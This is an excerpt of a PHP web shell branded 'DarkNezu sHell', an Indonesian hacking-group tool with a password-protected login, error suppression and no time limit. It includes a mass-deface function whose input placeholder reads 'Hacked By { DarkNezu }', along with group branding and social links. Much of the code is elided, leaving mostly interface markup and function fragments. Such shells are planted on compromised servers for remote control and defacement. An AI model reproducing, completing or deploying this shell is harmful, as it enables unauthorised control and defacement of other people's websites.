...
/*
    ...
    * Shell Ini Di Buat Dengan Hati, Dan Juga Di Recode Dengan Keinginan AWOKWOKOKW
*/
session_start();
error_reporting(0);
@set_time_limit(0);
...
/* Configurasi */
$aupas = '3e4cad1bf07741c28ccd979943e46cfb'; // root@nezu
...
<html>
    <head>
        ...
        <meta name="copyright" content="{ DarkNezu }"/>
        <title>{ DarkNezu sHell }</title>
        <link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/DarkNezu.png"/>
    ...
    <body class="bg-dark text-center text-light">
        ...
        <a href="https://facebook.com/DarkNezuOfficial" class="text-muted fixed-bottom mb-3">Copyright 2022 @ { DarkNezu }</a>
    </body>
</html>
<?php
exit;
...
function about() {
    echo '<div class="card text-center bg-light about">
        <h4 class="card-header">{ DarkNezu }</h4>
        <div class="card-body">
            <center><div class="img"></div></center>
            <p class="card-text">{ DarkNezu } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
        </div>
        <div class="card-footer">
            <small class="card-text text-muted">Copyright 2022 { DarkNezu }</small>
        </div>
    </div><br/>';
    exit;
}
...
function aksiMasdef($dir, $file, $imgfol, $imgfile) {
    ...
    if ($_POST['start']) {
        ...
        echo "<form method='post'>
            ...
            <textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By { DarkNezu }'></textarea><br/>
    ...
    <body class="bg-dark text-light">
        ...
        <nav class="navbar static-top navbar-dark">
            ...
            <div class="collapse navbar-collapse" id="info">
                <ul>
                    <a href="https://facebook.com/DarkNezuOfficial" class="lain"><i class="fa fa-facebook tambah"></i></a>
                    <a href="https://www.instagram.com/DarkNezu.id" class="lain"><i class="fa fa-instagram tambah"></i></a>
                    <a href="https://www.youtube.com/DarkNezu" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
                    <a href="https://github.com/DarkNezuid" class="lain"><i class="fa fa-github tambah"></i></a>
                    <a href="https://DarkNezu.web.id" class="lain"><i class="fa fa-globe tambah"></i></a>
                </ul>
            </div>
        </nav>
        <div class="container">
            <h1 class="text-center"><a href="https://facebook.com/DarkNezuOfficial" style="color:#ffffff;">{ DarkNezu }</h1>
            ...
            <div class="col-md-7 mt-4">
                ...
                */
                ...
                <center><a class="text-muted" href="https://facebook.com/DarkNezuOfficial">Copyright 2022 { DarkNezu }</a></center><br/>
